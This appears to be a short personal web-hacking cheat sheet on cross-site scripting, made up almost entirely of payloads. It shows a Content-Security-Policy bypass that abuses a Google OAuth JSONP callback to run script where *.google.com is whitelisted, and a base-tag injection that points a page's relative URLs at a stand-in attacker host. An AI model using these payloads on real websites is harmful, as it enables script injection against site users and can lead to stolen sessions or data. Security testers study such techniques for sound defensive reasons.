---
title: xss
author: janger
date: 2023-09-25
category: Web Hacking
layout: post
---

> **Google JSON API XSS**

If the target server is accepting addresses from Google, use the

```Content-Security-Policy: default-src 'self'; script-src *.google.com```

```html
<html>
    <head>...</head>
    <body>    
        <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"></script>
    </body>
</html>
```


> **base tag url XSS**

```html
<base href="https://attacker.io/">
```
